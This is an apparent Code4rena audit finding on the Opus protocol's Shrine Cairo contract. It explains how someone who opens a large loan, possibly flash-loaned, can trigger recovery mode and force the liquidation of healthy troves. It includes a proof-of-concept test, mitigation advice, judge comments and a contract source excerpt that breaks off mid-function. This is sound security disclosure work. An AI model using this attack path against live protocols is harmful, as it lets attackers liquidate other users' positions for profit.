{
  "Title": "[H-04] Shrine's recovery mode can be weaponized as leverage to liquidate healthy troves",
  "Content": "\n### Lines of code\n\n<https://github.com/code-423n4/2024-01-opus/blob/4720e9481a4fb20f4ab4140f9cc391a23ede3817/src/core/shrine.cairo#L1046>\n\n### Description\n\nIn the Shrine implementation, the loan (trove) health is calculated by having its LTV compared to the shrine threshold:\n\n```cairo\nFile: shrine.cairo\n1133:         fn is_healthy_helper(self: @ContractState, health: Health) -> bool {\n1134:             health.ltv <= health.threshold\n1135:         }\n---\n1140:         fn assert_valid_trove_action(self: @ContractState, trove_id: u64) {\n1141:             let health: Health = self.get_trove_health(trove_id);\n1142:             assert(self.is_healthy_helper(health), 'SH: Trove LTV is too high');\n```\n\nThe shrine threshold is in turn calculated from the weighted thresholds of the yang deposits, scaled down by a variable factor, in case the shrine is in recovery mode:\n\n```cairo\nFile: shrine.cairo\n1040:         fn get_trove_health(self: @ContractState, trove_id: u64) -> Health {\n---\n1045:             let (mut threshold, mut value) = self.get_threshold_and_value(trove_yang_balances, interval);\n1046:             threshold = self.scale_threshold_for_recovery_mode(threshold);\n---\n1202:         fn scale_threshold_for_recovery_mode(self: @ContractState, mut threshold: Ray) -> Ray {\n1203:             let shrine_health: Health = self.get_shrine_health();\n1204: \n1205:             if self.is_recovery_mode_helper(shrine_health) {\n1206:                 let recovery_mode_threshold: Ray = shrine_health.threshold * RECOVERY_MODE_THRESHOLD_MULTIPLIER.into();\n1207:                 return max(\n1208:                     threshold * THRESHOLD_DECREASE_FACTOR.into() * (recovery_mode_threshold / shrine_health.ltv),\n1209:                     (threshold.val / 2_u128).into()\n1210:                 );\n1211:             }\n1212: \n1213:             threshold\n1214:         }\n```\n\nWe can see from the above code that triggering recovery mode lowers the threshold, exposing the more under-collateralized loans (troves) to liquidation. This is expected behavior when the LTV fluctuations are coming from collateral price swings.\n\nIf we look at how recovery mode is triggered:\n\n```cairo\nFile: shrine.cairo\n0079:     const RECOVERY_MODE_THRESHOLD_MULTIPLIER: u128 = 700000000000000000000000000; // 0.7 (ray)\n---\n1165:         fn is_recovery_mode_helper(self: @ContractState, health: Health) -> bool {\n1166:             let recovery_mode_threshold: Ray = health.threshold * RECOVERY_MODE_THRESHOLD_MULTIPLIER.into();\n1167:             health.ltv >= recovery_mode_threshold\n1168:         }\n```\n\nWe can see that all it takes to trigger recovery mode is to bring the shrine LTV to 70% of its nominal threshold, or higher. This can be achieved by a malicious (or naive) user, provided they have enough collateral to take large borrows close to the collateralization threshold, and the shrine `debt_ceiling` provides enough headroom.\n\n### Impact\n\nLoans can be forced into liquidation territory, and be liquidated, whenever a new loan is opened large enough to trigger recovery mode.\nThis can also happen as a deliberate attack, and within a single transaction, without exposing the attacker's funds to liquidation. It is consequently a solid candidate for a flash loan attack, but can also be executed with a large amount of pre-deposited collateral.\n\n### Proof of Concept\n\nThe following test case can be added to `test_shrine.cairo` to show how a large collateral injection `+` large loan can force a pre-existing loan into an unhealthy state, ready to be liquidated:\n\n```cairo\n    #[test]\n    fn test_shrine_recovery() {\n        let wad: u128 = 1000000000000000000;\n        let shrine: IShrineDispatcher = shrine_utils::shrine_setup_with_feed(Option::None);\n        let yangs: Span<ContractAddress> = shrine_utils::three_yang_addrs();\n        let yang1_addr: ContractAddress = *yangs.at(0);\n\n        // trove 1: deposits 1 wad, mints nothing - they just contribute to the health of the protocol\n        start_prank(CheatTarget::One(shrine.contract_address), shrine_utils::admin());\n        let trove1_deposit: u128 = 1 * wad;\n        shrine.deposit(yang1_addr, 1, trove1_deposit.into());\n\n        // trove 2: deposits 1 wad, mints 90% of what they can (slightly overcollateralized)\n        let trove2_deposit: u128 = 1 * wad;\n        shrine.deposit(yang1_addr, 2, trove2_deposit.into());\n\n        let forge_amt2 = shrine.get_max_forge(2).val * 9 / 10;\n        shrine.forge(shrine_utils::admin(), 2, forge_amt2.into(), WadZeroable::zero());\n\n        // life is good\n        let mut health = shrine.get_shrine_health();\n        assert(false == shrine.is_recovery_mode(), '');\n\n        // trove 3: deposits a flash-loaned collateral, mints A LOT to raise the LTV \n        let trove3_deposit: u128 = 10 * wad;\n        shrine.deposit(yang1_addr, 3, trove3_deposit.into());\n\n        let forge_amt3: u128 = shrine.get_max_forge(3).val * 85 / 100;\n        shrine.forge(shrine_utils::admin(), 3, forge_amt3.into(), WadZeroable::zero());\n\n        health = shrine.get_shrine_health();\n        let trove2_health = shrine.get_trove_health(2);\n\n        // things are not good anymore. Shrine is in recovery mode and trove 2 can now be liquidated\n        assert(shrine.is_recovery_mode(), '');\n        assert(trove2_health.ltv > trove2_health.threshold, '')\n    }\n```\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nIt is not entirely clear how the recovery mechanism, intended as is, can be modified to fix this issue. Introducing a form of limitation to liquidations happening in the same block of a recovery trigger can mitigate exposure to flash-loans, but large loans against pre-owned collateral left dormant on the shrine would still be a viable attack path.\n\nWhat we can tell, however, is that the recovery mechanism appears to have the intent of increasing the difficulty of opening new loans as the shrine health approaches the liquidation threshold.\n\nPopular DeFi protocols like Compound solved this very issue by having two different LTV references: one for accepting liquidations and one lower for accepting new loans.\n\nMore in detail, the protocol is vulnerable only because one can borrow at LTV values above the recovery threshold (70% of the nominal threshold) but still below the liquidation threshold. Therefore, is able to raise the global LTV above that recovery threshold. If users were not allowed to borrow above that 70%, they wouldn't be able to raise the global LTV above it, even with infinite collateral.\n\n### Assessed type\n\nMEV\n\n**[tserg (Opus) confirmed and commented via duplicate issue #205](https://github.com/code-423n4/2024-01-opus-findings/issues/205#issuecomment-1931436006):**\n> This is valid - potentially fixed.\n\n**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-01-opus-findings/issues/9#issuecomment-1964601048):**\n > The warden has demonstrated how the automatic recovery mode mechanism of the Opus system can be exploited to force the system into recovery mode, enabling the liquidation of previously healthy troves.\n> \n> A high-risk vulnerability rating for this issue is valid as the automatic recovery mode can be exploited within a single transaction to force the system into recovery mode by opening a bad position, liquidating whichever troves are lucrative, and closing the previously bad position with zero risk.\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2024-01-opus",
  "Code": [
    {
      "filename": "src/core/shrine.cairo",
      "content": "#[starknet::contract]\nmod shrine {\n    use access_control::access_control_component;\n    use cmp::{max, min};\n    use core::starknet::event::EventEmitter;\n    use integer::{BoundedU256, U256Zeroable, u256_safe_div_rem};\n    use opus::core::roles::shrine_roles;\n    use opus::interfaces::IERC20::{IERC20, IERC20CamelOnly};\n    use opus::interfaces::ISRC5::ISRC5;\n    use opus::interfaces::IShrine::IShrine;\n    use opus::types::{\n        ExceptionalYangRedistribution, Health, Trove, YangBalance, YangRedistribution, YangSuspensionStatus\n    };\n    use opus::utils::exp::{exp, neg_exp};\n    use starknet::contract_address::{ContractAddress, ContractAddressZeroable};\n    use starknet::{get_block_timestamp, get_caller_address};\n    use wadray::{BoundedRay, Ray, RayZeroable, RAY_ONE, SignedWad, Wad, WadZeroable, WAD_DECIMALS, WAD_ONE, WAD_SCALE};\n\n    //\n    // Components\n    //\n\n    component!(path: access_control_component, storage: access_control, event: AccessControlEvent);\n\n    #[abi(embed_v0)]\n    impl AccessControlPublic = access_control_component::AccessControl<ContractState>;\n    impl AccessControlHelpers = access_control_component::AccessControlHelpers<ContractState>;\n\n    //\n    // Constants\n    //\n\n    // Initial multiplier value to ensure `get_recent_multiplier_from` terminates - (ray): RAY_ONE\n    const INITIAL_MULTIPLIER: u128 = 1000000000000000000000000000;\n    const MAX_MULTIPLIER: u128 = 10000000000000000000000000000; // Max of 10x (ray): 10 * RAY_ONE\n\n    const MAX_THRESHOLD: u128 = 1000000000000000000000000000; // (ray): RAY_ONE\n\n    // If a yang is deemed risky, it can be marked as suspended. During the\n    // SUSPENSION_GRACE_PERIOD, this decision can be reverted and the yang's status\n    // can be changed back to normal. If this does not happen, the yang is\n    // suspended permanently, i.e. can't be used in the system ever again.\n    // The start of a Yang's suspension period is tracked in `yang_suspension`\n    const SUSPENSION_GRACE_PERIOD: u64 =\n        consteval_int!((182 * 24 + 12) * 60 * 60); // 182.5 days, half a year, in seconds\n\n    // Length of a time interval in seconds\n    const TIME_INTERVAL: u64 = consteval_int!(30 * 60); // 30 minutes * 60 seconds per minute\n    const TIME_INTERVAL_DIV_YEAR: u128 =\n        57077625570776; // 1 / (48 30-minute intervals per day) / (365 days per year) = 0.000057077625 (wad)\n\n    // Threshold for rounding remaining debt during redistribution (wad): 10**9\n    const ROUNDING_THRESHOLD: u128 = 1000000000;\n\n    // Minimum amount of yang that must be in recipient troves for ordinary\n    // redistribution of yang to occur without overflow (wad): WAD_ONE\n    const MIN_RECIPIENT_POOL_YANG: u128 = 1000000000000000000;\n\n    // Maximum interest rate a yang can have (ray): RAY_ONE\n    const MAX_YANG_RATE: u128 = 1000000000000000000000000000;\n\n    // Flag for setting the yang's new base rate to its previous base rate in `update_rates`\n    // (ray): MAX_YANG_RATE + 1\n    const USE_PREV_BASE_RATE: u128 = 1000000000000000000000000001;\n\n    // Forge fee function parameters\n    const FORGE_FEE_A: u128 = 92103403719761827360719658187; // 92.103403719761827360719658187 (ray)\n    const FORGE_FEE_B: u128 = 55000000000000000; // 0.055 (wad)\n    // The lowest yin spot price where the forge fee will still be zero\n    const MIN_ZERO_FEE_YIN_PRICE: u128 = 995000000000000000; // 0.995 (wad)\n    // The maximum forge fee as a percentage of forge amount\n    const FORGE_FEE_CAP_PCT: u128 = 4000000000000000000; // 400% or 4 (wad)\n    // The maximum deviation before `FORGE_FEE_CAP_PCT` is reached\n    const FORGE_FEE_CAP_PRICE: u128 = 929900000000000000; // 0.9299 (wad)\n\n    // Convenience constant for upward iteration of yangs\n    const START_YANG_IDX: u32 = 1;\n\n    const RECOVERY_MODE_THRESHOLD_MULTIPLIER: u128 = 700000000000000000000000000; // 0.7 (ray)\n\n    // Factor that scales how much thresholds decline during recovery mode\n    const THRESHOLD_DECREASE_FACTOR: u128 = 1000000000000000000000000000; // 1 (ray)\n\n    // SRC5 interface constants\n    const ISRC5_ID: felt252 = 0x3f918d17e5ee77373b56385708f855659a07f75997f365cf87748628532a055;\n    const IERC20_ID: felt252 = 0x10a8f9ff27838cf36e9599878726d548a5c5c1acb0d7e04e99372cbb79f730b;\n    const IERC20_CAMEL_ID: felt252 = 0x2be91edd4cf1388a08c3612416baf85deb00e47d840e6d645f248c8ab64a4ab;\n\n    //\n    // Storage\n    //\n\n    #[storage]\n    struct Storage {\n        // components\n        #[substorage(v0)]\n        access_control: access_control_component::Storage,\n        // A trove can forge debt up to its threshold depending on the yangs deposited.\n        // (trove_id) -> (Trove)\n        troves: LegacyMap::<u64, Trove>,\n        // Stores the amount of the \"yin\" (synthetic) each user owns.\n        // (user_address) -> (Yin)\n        yin: LegacyMap::<ContractAddress, Wad>,\n        // Stores information about the total supply for each yang\n        // (yang_id) -> (Total Supply)\n        yang_total: LegacyMap::<u32, Wad>,\n        // Stores information about the initial yang amount minted to the system\n        initial_yang_amts: LegacyMap::<u32, Wad>,\n        // Number of collateral types accepted by the system.\n        // The return value is also the ID of the last added collateral.\n        yangs_count: u32,\n        // Mapping from yang ContractAddress to yang ID.\n        // Yang ID starts at 1.\n        // (yang_address) -> (yang_id)\n        yang_ids: LegacyMap::<ContractAddress, u32>,\n        // Keeps track of how much of each yang has been deposited into each Trove - Wad\n        // (yang_id, trove_id) -> (Amount Deposited)\n        deposits: LegacyMap::<(u32, u64), Wad>,\n        // Total amount of debt accrued for troves\n        // This includes any debt surplus already accounted for in the budget.\n        total_troves_debt: Wad,\n        // Total amount of synthetic forged and injected\n        total_yin: Wad,\n        // Current budget\n        // - If amount is negative, then there is a deficit i.e. `total_yin` > total debt\n        //   There is more yin in circulation than yin that needs to be repaid.\n        // - If amount is positive, then there is a surplus i.e. total debt > `total_yin`\n        //   There is more yin that needs to be repaid than in circulation.\n        // based on current on-chain conditions\n        budget: SignedWad,\n        // Keeps track of the price history of each Yang\n        // Stores both the actual price and the cumulative price of\n        // the yang at each time interval, both as Wads.\n        // - interval: timestamp divided by TIME_INTERVAL.\n        // (yang_id, interval) -> (price, cumulative_price)\n        yang_prices: LegacyMap::<(u32, u64), (Wad, Wad)>,\n        // Spot price of yin\n        yin_spot_price: Wad,\n        // Minimum value for a trove before a user can forge any debt\n        minimum_trove_value: Wad,\n        // Maximum amount of yin that can be generated. Once this ceiling is exceeded, the\n        // creation of new yin by users should be disallowed.\n        // - If the budget is positive, a user may create new yin only if the resulting total\n        //   yin amount and any debt surpluses is less than or equal to the ceiling.\n        // - If the budget is neutral or negative, a user may create new yin only if the resulting\n        //   total yin amount is less than the ceiling.\n        //\n        // Note that this does not  prevent interest from accruing or the budget from accruing\n        // a surplus, and positive budgets can still be minted as yin. Therefore, it is possible\n        // for the total amount of yin to exceed the debt ceiling.\n        debt_ceiling: Wad,\n        // Global interest rate multiplier\n        // stores both the actual multiplier, and the cumulative multiplier of\n        // the yang at each time interval, both as Rays\n        // (interval) -> (multiplier, cumulative_multiplier)\n        multiplier: LegacyMap::<u64, (Ray, Ray)>,\n        // Keeps track of the most recent rates index.\n        // Rate era starts at 1.\n        // Each index is associated with an update to the interest rates of all yangs.\n        rates_latest_era: u64,\n        // Keeps track of the interval at which the rate update at `era` was made.\n        // (era) -> (interval)\n        rates_intervals: LegacyMap::<u64, u64>,\n        // Keeps track of the interest rate of each yang at each era\n        // (yang_id, era) -> (Interest Rate)\n        yang_rates: LegacyMap::<(u32, u64), Ray>,\n        // Keeps track of when a yang was suspended\n        // 0 means it is not suspended\n        // (yang_id) -> (suspension timestamp)\n        yang_suspension: LegacyMap::<u32, u64>,\n        // Liquidation threshold per yang (as LTV) - Ray\n        // NOTE: don't read the value directly, instead use `get_yang_threshold_helper`\n        //       because a yang might be suspended; the function will return the correct\n        //       threshold value under all circumstances\n        // (yang_id) -> (Liquidation Threshold)\n        thresholds: LegacyMap::<u32, Ray>,\n        // Keeps track of how many redistributions have occurred\n        redistributions_count: u32,\n        // Last redistribution accounted for a trove\n        // (trove_id) -> (Last Redistribution ID)\n        trove_redistribution_id: LegacyMap::<u64, u32>,\n        // Keeps track of whether the redistribution involves at least one yang that\n        // no other troves has deposited.\n        // (redistribution_id) -> (Is exceptional redistribution)\n        is_exceptional_redistribution: LegacyMap::<u32, bool>,\n        // Mapping of yang ID and redistribution ID to\n        // 1. amount of debt in Wad to be redistributed to each Wad unit of yang\n        // 2. amount of debt to be added to the next redistribution to calculate (1)\n        // (yang_id, redistribution_id) -> YangRedistribution{debt_per_wad, debt_to_add_to_next}\n        yang_redistributions: LegacyMap::<(u32, u32), YangRedistribution>,\n        // Mapping of recipient yang ID, redistribution ID and redistributed yang ID to\n        // 1. amount of redistributed yang per Wad unit of recipient yang\n        // 2. amount of debt per Wad unit of recipient yang\n        yang_to_yang_redistribution: LegacyMap::<(u32, u32, u32), ExceptionalYangRedistribution>,\n        // Keeps track of whether shrine is live or killed\n        is_live: bool,\n        // Yin storage\n        yin_name: felt252,\n        yin_symbol: felt252,\n        yin_decimals: u8,\n        // Mapping of user's yin allowance for another user\n        // (user_address, spender_address) -> (Allowance)\n        yin_allowances: LegacyMap::<(ContractAddress, ContractAddress), u256>,\n    }\n\n    //\n    // Events\n    //\n\n    #[event]\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    enum Event {\n        AccessControlEvent: access_control_component::Event,\n        YangAdded: YangAdded,\n        YangTotalUpdated: YangTotalUpdated,\n        TotalTrovesDebtUpdated: TotalTrovesDebtUpdated,\n        BudgetAdjusted: BudgetAdjusted,\n        MultiplierUpdated: MultiplierUpdated,\n        YangRatesUpdated: YangRatesUpdated,\n        ThresholdUpdated: ThresholdUpdated,\n        ForgeFeePaid: ForgeFeePaid,\n        TroveUpdated: TroveUpdated,\n        TroveRedistributed: TroveRedistributed,\n        DepositUpdated: DepositUpdated,\n        YangPriceUpdated: YangPriceUpdated,\n        YinPriceUpdated: YinPriceUpdated,\n        MinimumTroveValueUpdated: MinimumTroveValueUpdated,\n        DebtCeilingUpdated: DebtCeilingUpdated,\n        YangSuspended: YangSuspended,\n        YangUnsuspended: YangUnsuspended,\n        Killed: Killed,\n        Transfer: Transfer,\n        Approval: Approval,\n    }\n\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    struct YangAdded {\n        #[key]\n        yang: ContractAddress,\n        yang_id: u32,\n        start_price: Wad,\n        initial_rate: Ray\n    }\n\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    struct YangTotalUpdated {\n        #[key]\n        yang: ContractAddress,\n        total: Wad\n    }\n\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    struct TotalTrovesDebtUpdated {\n        total: Wad\n    }\n\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    struct BudgetAdjusted {\n        amount: SignedWad\n    }\n\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    struct MultiplierUpdated {\n        multiplier: Ray,\n        cumulative_multiplier: Ray,\n        #[key]\n        interval: u64\n    }\n\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    struct YangRatesUpdated {\n        #[key]\n        rate_era: u64,\n        current_interval: u64,\n        yangs: Span<ContractAddress>,\n        new_rates: Span<Ray>\n    }\n\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    struct ThresholdUpdated {\n        #[key]\n        yang: ContractAddress,\n        threshold: Ray\n    }\n\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    struct ForgeFeePaid {\n        #[key]\n        trove_id: u64,\n        fee: Wad,\n        fee_pct: Wad\n    }\n\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    struct TroveUpdated {\n        #[key]\n        trove_id: u64,\n        trove: Trove\n    }\n\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    struct TroveRedistributed {\n        #[key]\n        redistribution_id: u32,\n        #[key]\n        trove_id: u64,\n        debt: Wad\n    }\n\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    struct DepositUpdated {\n        #[key]\n        yang: ContractAddress,\n        #[key]\n        trove_id: u64,\n        amount: Wad\n    }\n\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    struct YangPriceUpdated {\n        #[key]\n        yang: ContractAddress,\n        price: Wad,\n        cumulative_price: Wad,\n        #[key]\n        interval: u64\n    }\n\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    struct YinPriceUpdated {\n        old_price: Wad,\n        new_price: Wad\n    }\n\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    struct MinimumTroveValueUpdated {\n        value: Wad\n    }\n\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    struct DebtCeilingUpdated {\n        ceiling: Wad\n    }\n\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    struct YangSuspended {\n        #[key]\n        yang: ContractAddress,\n        timestamp: u64\n    }\n\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    struct YangUnsuspended {\n        #[key]\n        yang: ContractAddress,\n        timestamp: u64\n    }\n\n\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    struct Killed {}\n\n    // ERC20 events\n\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    struct Transfer {\n        #[key]\n        from: ContractAddress,\n        #[key]\n        to: ContractAddress,\n        value: u256\n    }\n\n    #[derive(Copy, Drop, starknet::Event, PartialEq)]\n    struct Approval {\n        #[key]\n        owner: ContractAddress,\n        #[key]\n        spender: ContractAddress,\n        value: u256\n    }\n\n    //\n    // Constructor\n    //\n\n    #[constructor]\n    fn constructor(ref self: ContractState, admin: ContractAddress, name: felt252, symbol: felt252) {\n        self.access_control.initializer(admin, Option::Some(shrine_roles::default_admin_role()));\n\n        self.is_live.write(true);\n\n        // Seeding initial multiplier to the previous interval to ensure `get_recent_multiplier_from` terminates\n        // otherwise, the next multiplier update will run into an endless loop of `get_recent_multiplier_from`\n        // since it wouldn't find the initial multiplier\n        let prev_interval: u64 = now() - 1;\n        let init_multiplier: Ray = INITIAL_MULTIPLIER.into();\n        self.multiplier.write(prev_interval, (init_multiplier, init_multiplier));\n\n        // Setting initial rate era to 1\n        self.rates_latest_era.write(1);\n\n        // Setting initial yin spot price to 1\n        self.yin_spot_price.write(WAD_ONE.into());\n\n        // Emit event\n        self\n            .emit(\n                MultiplierUpdated {\n                    multiplier: init_multiplier, cumulative_multiplier: init_multiplier, interval: prev_interval\n                }\n            );\n\n        // ERC20\n        self.yin_name.write(name);\n        self.yin_symbol.write(symbol);\n        self.yin_decimals.write(WAD_DECIMALS);\n    }\n\n    //\n    // External Shrine functions\n    //\n\n    #[abi(embed_v0)]\n    impl IShrineImpl of IShrine<ContractState> {\n        //\n        // Getters\n        //\n\n        fn get_yin(self: @ContractState, user: ContractAddress) -> Wad {\n            self.yin.read(user)\n        }\n\n        fn get_total_yin(self: @ContractState) -> Wad {\n            self.total_yin.read()\n        }\n\n        // Get yin spot price\n        fn get_yin_spot_price(self: @ContractState) -> Wad {\n            self.yin_spot_price.read()\n        }\n\n        fn get_yang_total(self: @ContractState, yang: ContractAddress) -> Wad {\n            let yang_id: u32 = self.get_valid_yang_id(yang);\n            self.yang_total.read(yang_id)\n        }\n\n        fn get_initial_yang_amt(self: @ContractState, yang: ContractAddress) -> Wad {\n            let yang_id: u32 = self.get_valid_yang_id(yang);\n            self.initial_yang_amts.read(yang_id)\n        }\n\n        fn get_yangs_count(self: @ContractState) -> u32 {\n            self.yangs_count.read()\n        }\n\n        fn get_deposit(self: @ContractState, yang: ContractAddress, trove_id: u64) -> Wad {\n            let yang_id: u32 = self.get_valid_yang_id(yang);\n            self.deposits.read((yang_id, trove_id))\n        }\n\n        fn get_budget(self: @ContractState) -> SignedWad {\n            self.budget.read()\n        }\n\n        fn get_yang_price(self: @ContractState, yang: ContractAddress, interval: u64) -> (Wad, Wad) {\n            let yang_id: u32 = self.get_valid_yang_id(yang);\n            self.yang_prices.read((yang_id, interval))\n        }\n\n        fn get_yang_rate(self: @ContractState, yang: ContractAddress, rate_era: u64) -> Ray {\n            let yang_id: u32 = self.get_valid_yang_id(yang);\n            self.yang_rates.read((yang_id, rate_era))\n        }\n\n        fn get_current_rate_era(self: @ContractState) -> u64 {\n            self.rates_latest_era.read()\n        }\n\n        fn get_minimum_trove_value(self: @ContractState) -> Wad {\n            self.minimum_trove_value.read()\n        }\n\n        fn get_debt_ceiling(self: @ContractState) -> Wad {\n            self.debt_ceiling.read()\n        }\n\n        fn get_multiplier(self: @ContractState, interval: u64) -> (Ray, Ray) {\n            self.multiplier.read(interval)\n        }\n\n        fn get_yang_suspension_status(self: @ContractState, yang: ContractAddress) -> YangSuspensionStatus {\n            let yang_id: u32 = self.get_valid_yang_id(yang);\n            self.get_yang_suspension_status_helper(yang_id)\n        }\n\n        // Returns a tuple of\n        // 1. The \"raw yang threshold\"\n        // 2. The \"scaled yang threshold\" for recovery mode\n        // 1 and 2 will be the same if recovery mode is not in effect\n        fn get_yang_threshold(self: @ContractState, yang: ContractAddress) -> (Ray, Ray) {\n            let yang_id: u32 = self.get_valid_yang_id(yang);\n            let threshold = self.get_yang_threshold_helper(yang_id);\n            (threshold, self.scale_threshold_for_recovery_mode(threshold))\n        }\n\n        // Returns a Health struct comprising the Shrine's threshold, LTV, value and debt;\n        fn get_shrine_health(self: @ContractState) -> Health {\n            let (threshold, value) = self.get_threshold_and_value(self.get_shrine_deposits(), now());\n            let debt: Wad = self.total_troves_debt.read();\n\n            // If no collateral has been deposited, then shrine's LTV is\n            // returned as the maximum possible value.\n            let ltv: Ray = if value.is_zero() {\n                BoundedRay::max()\n            } else {\n                wadray::rdiv_ww(debt, value)\n            };\n\n            Health { threshold, ltv, value, debt }\n        }\n\n        fn get_redistributions_count(self: @ContractState) -> u32 {\n            self.redistributions_count.read()\n        }\n\n        fn get_trove_redistribution_id(self: @ContractState, trove_id: u64) -> u32 {\n            self.trove_redistribution_id.read(trove_id)\n        }\n\n        fn get_redistribution_for_yang(\n            self: @ContractState, yang: ContractAddress, redistribution_id: u32\n        ) -> YangRedistribution {\n            let yang_id: u32 = self.get_valid_yang_id(yang);\n            self.yang_redistributions.read((yang_id, redistribution_id))\n        }\n\n        fn get_exceptional_redistribution_for_yang_to_yang(\n            self: @ContractState,\n            recipient_yang: ContractAddress,\n            redistribution_id: u32,\n            redistributed_yang: ContractAddress\n        ) -> ExceptionalYangRedistribution {\n            let recipient_yang_id: u32 = self.get_valid_yang_id(recipient_yang);\n            let redistributed_yang_id: u32 = self.get_valid_yang_id(redistributed_yang);\n            self.yang_to_yang_redistribution.read((recipient_yang_id, redistribution_id, redistributed_yang_id))\n        }\n\n        fn is_recovery_mode(self: @ContractState) -> bool {\n            let shrine_health: Health = self.get_shrine_health();\n            self.is_recovery_mode_helper(shrine_health)\n        }\n\n        fn get_live(self: @ContractState) -> bool {\n            self.is_live.read()\n        }\n\n        //\n        // Setters - External\n        //\n\n        // `initial_yang_amt` is passed as an argument from upstream to address the issue of\n        // first depositor front-running by requiring an initial deposit when adding the yang\n        // to the Shrine\n        fn add_yang(\n            ref self: ContractState,\n            yang: ContractAddress,\n            threshold: Ray,\n            start_price: Wad,\n            initial_rate: Ray,\n            initial_yang_amt: Wad\n        ) {\n            self.access_control.assert_has_role(shrine_roles::ADD_YANG);\n\n            assert(self.yang_ids.read(yang) == 0, 'SH: Yang already exists');\n\n            assert_rate_is_valid(initial_rate);\n\n            // Assign new ID to yang and add yang struct\n            let yang_id: u32 = self.yangs_count.read() + 1;\n            self.yang_ids.write(yang, yang_id);\n\n            // Update yangs count\n            self.yangs_count.write(yang_id);\n\n            // Set threshold\n            self.set_threshold_helper(yang, threshold);\n\n            // Update initial yang supply\n            // Used upstream to prevent first depositor front running\n            self.yang_total.write(yang_id, initial_yang_amt);\n            self.initial_yang_amts.write(yang_id, initial_yang_amt);\n\n            // Since `start_price` is the first price in the price history, the cumulative price is also set to `start_price`\n\n            let prev_interval: u64 = now() - 1;\n            // seeding initial price to the previous interval to ensure `get_recent_price_from` terminates\n            // new prices are pushed to Shrine from an oracle via `advance` and are always set on the current\n            // interval (`now()`); if we wouldn't set this initial price to `now() - 1` and oracle could\n            // update a price still in the current interval (as oracle update times are independent of\n            // Shrine's intervals, a price can be updated multiple times in a single interval) which would\n            // result in an endless loop of `get_recent_price_from` since it wouldn't find the initial price\n            self.yang_prices.write((yang_id, prev_interval), (start_price, start_price));\n\n            // Setting the base rate for the new yang\n\n            // NOTE: Eras are not incremented when a new yang is added, and the era that is being set\n            // for this base rate will have an interval that is <= now(). This would be a problem\n            // if there could be a trove containing the newly-added with `trove.last_rate_era < latest_era`.\n            // Luckily, this isn't possible because `charge` is called in `deposit`, so a trove's `last_rate_era`\n            // will always be updated to `latest_era` immediately before the newly-added yang is deposited.\n            let latest_era: u64 = self.rates_latest_era.read();\n            self.yang_rates.write((yang_id, latest_era), initial_rate);\n\n            // Event emissions\n            self.emit(YangAdded { yang, yang_id, start_price, initial_rate });\n            self.emit(YangTotalUpdated { yang, total: initial_yang_amt });\n        }\n\n        fn set_threshold(ref self: ContractState, yang: ContractAddress, new_threshold: Ray) {\n            self.access_control.assert_has_role(shrine_roles::SET_THRESHOLD);\n\n            self.set_threshold_helper(yang, new_threshold);\n        }\n\n        fn suspend_yang(ref self: ContractState, yang: ContractAddress) {\n            self.access_control.assert_has_role(shrine_roles::UPDATE_YANG_SUSPENSION);\n\n            assert(self.get_yang_suspension_status(yang) == YangSuspensionStatus::None, 'SH: Already suspended');\n\n            let timestamp: u64 = get_block_timestamp();\n            self.yang_suspension.write(self.get_valid_yang_id(yang), timestamp);\n            self.emit(YangSuspended { yang, timestamp });\n        }\n\n        fn unsuspend_yang(ref self: ContractState, yang: ContractAddress) {\n            self.access_control.assert_has_role(shrine_roles::UPDATE_YANG_SUSPENSION);\n\n            assert(\n                self.get_yang_suspension_status(yang) != YangSuspensionStatus::Permanent, 'SH: Suspension is permanent'\n            );\n\n            self.yang_suspension.write(self.get_valid_yang_id(yang), 0);\n            self.emit(YangUnsuspended { yang, timestamp: get_block_timestamp() });\n        }\n\n        // Update the base rates of all yangs\n        // A base rate of USE_PREV_BASE_RATE means the base rate for the yang stays the same\n        // Takes an array of yangs and their updated rates.\n        // yangs[i]'s base rate will be set to new_rates[i]\n        // yangs's length must equal the number of yangs available.\n        fn update_rates(ref self: ContractState, yangs: Span<ContractAddress>, new_rates: Span<Ray>) {\n            self.access_control.assert_has_role(shrine_roles::UPDATE_RATES);\n\n            let yangs_len = yangs.len();\n            let num_yangs: u32 = self.yangs_count.read();\n\n            assert(yangs_len == num_yangs, 'SH: Too few yangs');\n            assert(yangs_len == new_rates.len(), 'SH: yangs.len != new_rates.len');\n\n            let latest_rate_era: u64 = self.rates_latest_era.read();\n            let latest_rate_era_interval: u64 = self.rates_intervals.read(latest_rate_era);\n            let current_interval: u64 = now();\n\n            // If the interest rates were already updated in the current interval, don't increment the era\n            // Otherwise, increment the era\n            // This way, there is at most one set of base rate updates in every interval\n            let mut rate_era = latest_rate_era;\n\n            if latest_rate_era_interval != current_interval {\n                rate_era += 1;\n                self.rates_latest_era.write(rate_era);\n                self.rates_intervals.write(rate_era, current_interval);\n            }\n\n            // ALL yangs must have a new rate value. A new rate value of `USE_PREV_BASE_RATE` means the\n            // yang's rate isn't being updated, and so we get the previous value.\n            let mut yangs_copy = yangs;\n            let mut new_rates_copy = new_rates;\n            // TODO: temporary workaround for issue with borrowing snapshots in loops\n            let self_snap = @self;\n            loop {\n                match new_rates_copy.pop_front() {\n                    Option::Some(rate) => {\n                        let current_yang_id: u32 = 